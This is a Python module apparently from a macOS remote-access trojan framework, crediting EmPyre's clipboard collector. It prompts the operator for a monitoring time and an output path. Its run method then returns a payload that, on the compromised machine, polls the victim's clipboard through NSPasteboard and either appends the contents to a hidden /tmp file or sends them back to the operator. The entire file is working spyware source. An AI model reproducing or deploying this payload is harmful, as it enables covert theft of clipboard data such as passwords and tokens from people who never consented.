from modules.helpers import ModuleABC
import os
import uuid


class Module(ModuleABC):
    def __init__(self):
        self.monitor_time = 0
        self.output_file = ""
        self.is_task = True

    def get_info(self):
        return {
            "Author": ["Marten4n6"],
            "Description": "Retrieve or monitor the client's clipboard.",
            "References": [
                "https://github.com/EmpireProject/EmPyre/blob/master/lib/modules/collection/osx/clipboard.py"
            ],
            "Task": self.is_task
        }

    def setup(self, module_input, view, successful):
        self.monitor_time = module_input.prompt("Time in seconds to monitor the clipboard [ENTER for 0]: ")

        if not self.monitor_time:
            self.monitor_time = "0"

        if not self.monitor_time.isdigit():
            view.output("Invalid monitor time (should be in seconds).", "attention")

            successful.put(False)
        else:
            self.is_task = True if int(self.monitor_time) > 1 else False
            should_output = module_input.prompt("Would you like to output to a file? [y/N] ").lower()

            if should_output == "y":
                self.output_file = module_input.prompt("Remote file to output to [ENTER for /tmp/<RANDOM>]:")

                if not self.output_file:
                    self.output_file = os.path.join("/tmp", str(uuid.uuid4()).replace("-", "")[:12] + ".txt")
            else:
                self.output_file = ""

            successful.put(True)

    def run(self):
        return """\
        from AppKit import NSPasteboard, NSStringPboardType
        import time
        import datetime
        import sys

        def monitor_clipboard(monitor_time=0):
            sleep_time = 0
            last = ""
            out_file = "{}"

            while sleep_time <= monitor_time:
                try:
                    pb = NSPasteboard.generalPasteboard()
                    pbstring = pb.stringForType_(NSStringPboardType)
                    
                    if pbstring != last:
                        if out_file != "":
                            with open(out_file, "a+") as f:
                                f.write(pbstring + "\\n")
                        else:
                            ts = time.time()
                            st = datetime.datetime.fromtimestamp(ts).strftime("%%H:%%M:%%S")
                            send_response("[clipboard] " + st + ": '%%s'".encode("utf-8") %% str(pbstring), "clipboard")

                    last = pbstring
                    time.sleep(1)
                    sleep_time += 1
                except Exception as ex:
                    print str(ex)
            
            if out_file != "":
                send_response("Clipboard written to: " + out_file, "clipboard")

        monitor_clipboard(monitor_time={})
        """.format(self.output_file, self.monitor_time)
